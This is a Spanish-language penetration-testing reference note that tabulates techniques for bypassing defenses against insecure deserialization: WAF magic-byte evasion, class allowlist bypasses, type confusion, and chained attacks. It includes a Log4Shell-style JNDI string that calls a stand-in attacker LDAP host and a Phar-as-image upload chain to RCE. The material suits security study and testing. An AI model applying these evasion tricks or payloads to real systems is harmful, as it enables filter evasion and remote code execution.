---
aliases:
  - Deserialization Bypass
  - Allowlist Bypass
  - JEP 290 Bypass
  - Filter Bypass
tags:
  - type/technique
  - vuln/insecure-deser
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Insecure Deserialization]]'
---
# Insecure Deserialization - Bypasses y Evasión

***

## Magic Bytes y Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| WAF que filtra `aced0005` | Comprimir con gzip antes de enviar | `0x1f 0x8b` reemplaza header — algunos backends descomprimen auto. |
| WAF que filtra `O:8:` (PHP) | Convertir a uppercase / hex char escapes | `s:` → `S:` (algunos PHP versions aceptan ambos). |
| WAF que filtra `rO0` (b64 java) | Wrap en otro encoding | base32 / hex / multiple b64 layers. |
| WAF que filtra `gAS` / `gAR` (pickle) | Usar protocolo 0/1 (ASCII pickle) | `pickle.dumps(obj, protocol=0)` produce ASCII puro. |
| WAF que filtra `BinaryFormatter` strings | NetDataContractSerializer / SoapFormatter alternatives | Mismo gadget, formatter distinto. |
| Padding manipulation | Agregar bytes basura al final del stream | Algunos parsers ignoran trailing bytes. |
| Stream offset abuse | Iniciar stream con bytes basura, real data al medio | Parser puede skipear hasta encontrar magic. |
| Mixed encoding chain | base64(zlib(serialized)) | Múltiples capas. |
| URL-encode + base64 doble | `urlencode(base64(payload))` y luego `base64(urlencode(...))` | Bypass de regex por orden. |
| Unicode normalization | Char `O` (U+004F) ↔ `Ｏ` (U+FF2F fullwidth) | Algunos parsers normalizan Unicode antes de check. |
| Compression bombs | Gzip que expande masivamente | DoS + bypass de tamaño. |
| Truncated stream | Stream incompleto que igual triggerea sink | Algunos parsers procesan partial. |
^deser-bypass-bytes

___

## Class Allowlist Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Java JEP 290 (jdk.serialFilter) | Bypass usando classes en pkg permitido pero con efectos secundarios | Buscar gadgets en allowlist. |
| Java SerializationFilter — chained class | Inner classes / lambdas que evaden check de class name | `Class$Inner` patterns. |
| .NET SerializationBinder strict | Usar tipos del mscorlib que sí están permitidos como triggers | `System.IO.FileInfo`, `System.Text.RegularExpressions.RegexCompilationInfo`, etc. |
| Jackson blacklist (`addDeserializationProblemHandler`) | Buscar gadget no listado en blacklist | Cada CVE Jackson agrega una clase, los attackers encuentran nuevas. |
| FastJson safeMode bypass | Reference notation `L<class>;` | Notación alternativa. |
| FastJson autoTypeSupport bypass | `@type` con `class.getName()` mangled | URL-encode dentro del nombre. |
| PHP allow_classes filter | `unserialize($s, ['allowed_classes' => [SafeClass::class]])` | Si lista mal definida o `true`, todas pasan. |
| Pickle restricted unpickler bypass | Subclass `Unpickler.find_class` no estricto | Heredar de StackBased es común. |
| YAML safe_load permitted_classes | Si lista incluye clase con `__init__` peligroso | Audit lista. |
| Polymorphism via interface | Si filter chequea por class concreta pero acepta interface, usar gadget que implement la interface. | Common en Java. |
| Static initializer trigger | Class con `static { ... }` block ejecutable | Solo carga = ejecución. |
| ClassNotFoundException race | Filtros que validan después de loadClass | Race condition trigger. |
^deser-bypass-allowlist

___

## Length / Type Confusion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| PHP CVE-2016-7124 `__wakeup` bypass | Anunciar más props que las que hay | `O:4:"User":2:{...una sola prop...}` → __wakeup no se llama. |
| PHP fast-destruct | Reference loops para ejecutar `__destruct` antes que `__wakeup` | Trick específico PHP. |
| Java integer overflow en stream length | Length absurdo en serialized field | Algunos parsers mal manejan. |
| Java `enableResolveObject` confusion | resolveObject hook mal implementado | Bypass de filtros. |
| .NET Type confusion entre `[Serializable]` y custom | Forge tipo con TypeConfuseDelegate | Gadget oficial ysoserial.net. |
| PHP type juggling string→object | `"O:8:..."` interpretado como string | Si app `==` compara loosely. |
| YAML duplicate keys | `key: a\nkey: b` | Backend puede tomar primer o último — race. |
| JSON duplicate keys | Mismo concepto en JSON | RFC dice undefined — varía por lib. |
| Pickle proto 0 vs proto 4+ | Mezclar protocolos en mismo stream | Algunos unpicklers no validan. |
| Length prefix mismatch | Anunciar string de 100 bytes pero pasar 50 | Buffer overrun → behavior raro. |
^deser-bypass-types

___

## Deser Encadenada (multi-hop)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Gadget de file write → trigger pickle en `.pyc` | Forge archivo `.pyc` que luego se importa | Multi-stage. |
| Java URLDNS → JRMP → RCE | Chain de gadgets pequeños | Cuando un solo gadget no llega. |
| LFI + Phar (PHP) | Subir Phar como `.jpg`, LFI lo lee como `phar://` → unserialize → RCE | Bypass de filtros file upload. |
| SSRF + JNDI (Java Log4Shell-style) | Inyectar `${jndi:ldap://attacker/}` | LDAP server entrega gadget Java. |
| XXE + Phar (PHP) | XXE leak path de upload, después phar:// | Combo. |
| Polyglot Phar/JPG/GIF | File con magic bytes válidos para 3 formatos | Bypass de validación MIME. |
| ViewState → SSRF → MachineKey leak → RCE | Chain ASP.NET clásica | Multi-step. |
| Pickle inside Numpy/Pandas → file load triggers | Cargar npy/parquet con embedded pickle | Stealth. |
| YAML inside Helm chart → cluster RCE | Kubernetes config → controller deser | Cloud-specific. |
^deser-bypass-chained

***
